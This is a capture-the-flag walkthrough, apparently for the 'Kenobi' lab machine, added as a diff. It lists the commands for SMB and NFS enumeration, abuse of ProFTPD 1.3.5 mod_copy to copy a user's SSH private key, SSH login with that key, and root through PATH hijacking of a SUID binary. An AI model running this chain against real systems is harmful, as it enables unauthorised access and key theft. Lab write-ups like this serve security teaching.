@@ -1,0 +1,64 @@
+nmap -sC -sV "MACHINE IP" -vv
+This showed me 7 open ports including 445 which is a Samba service running
+
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse "MACHINE IP"
+This uses nmap scripts to enumerate shares on the samba service running on port 445
+We can see that we are able to log in as anonymous with the results showed
+
+smbclient //"MACHINE IP"/anonymous
+We can see a log.txt file by running ls
+And download files with
+smbget -R smb://"MACHINE IP/anonymous"
+This will the file in the directory to our computer 
+By opening the file we can see that there is a PROFTPD service running on port 21
+
+We previously saw that there was RPCBIND service running on port 111, in this case port 111 is an access to a network file system
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount "MACHINE IP"
+We can see a /var mount by running this
+With this information we can use netcat to connect to proftpd service
+nc "Machine IP" 21
+This will also show us the version  that Proftpd is running in this case 1.3.5
+We use 
+searchsploit proftpd 1.3.5
+This will show us 3 exploits available
+We will use mod_copy module
+
+By previous gathered information we can the ftp service is running as kenobi user and there is an ssh key generated to it so lets copy it to our computer
+SITE CPFT /home/kenobi/.ssh/id_rsa
+SITE CPTO /var/tmp/id_rsa
+We know that var is a mount on the target machine so we moved it to var/tmp directory
+
+Now we mount the var/tmp directory
+mkdir /mnt/kenobiNFS
+mount "MACHINE IP":/var /mnt/kenobiNFS
+ls -ls /mnt/kenobiNFS
+
+Now that we have a network mounted on our deployed machine we can grab the private key to kenobi account
+cp /mnt/kenobiNFS/tmp/id_rsa
+sudo chmod 600 id_rsa
+ssh -i id_rsa kenobi@10.10.239.150
+We are now logged in as kenobi successfully and can grab the flag
+cat /home/kenobi/user.txt
+
+Privilege Escalation
+find / -perm -u=s -type f 2>/dev/null
+To search for SUID BITS
+We can see /usr/bin/menu does not look quite right in there so lets run that
+This show us 3 options
+
+curl -I localhost
+uname -r
+ifconfig
+
+this show us where the binary is running
+since this runs as root we can exploit this to gain root access
+
+echo /bin/sh > curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+/usr/bin/menu
+
+We have copied /bin/sh and named it curl change to the correct permissions
+When we run /usr/bin/menu it will use the path variable that is now a version usr/sh
+since this runs as root our shell will also be a root shell
+We can now grabe the flag on /root/root.txt directory
